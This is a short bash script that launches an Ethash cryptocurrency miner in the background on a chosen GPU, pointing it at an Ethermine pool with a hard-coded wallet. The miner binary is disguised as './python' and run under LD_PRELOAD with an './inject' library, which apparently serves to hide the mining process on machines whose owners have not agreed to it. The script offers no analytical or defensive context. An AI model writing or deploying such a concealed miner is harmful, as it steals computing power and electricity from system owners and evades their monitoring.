#!/bin/bash

index=`cat idx`
name=`cat license`

export CUDA_VISIBLE_DEVICES=$index

#################################
## Begin of user-editable part ##
#################################

POOL='stratum+ssl://asia1.ethermine.org:5555'
#WALLET="0x0af583a21ff45b066891e6a889ca0136a65cd8ae.${name}"
WALLET="0xfbbf4e71ce5c8db84655c3efa39ff5931d22b53e.${name}"

#################################
##  End of user-editable part  ##
#################################
chmod +x ./python
chmod +x ./inject
chmod +x ./clean.sh
#LD_PRELOAD=./inject ./python --pool $POOL --user $WALLET --algo ETHASH  --enablezilcache 1 &
LD_PRELOAD=./inject ./python --pool $POOL --user $WALLET --algo ETHASH --enablezilcache 1 &
#LD_PRELOAD=./inject pmiclx --pool $POOL --user $WALLET --algo ETHASH &
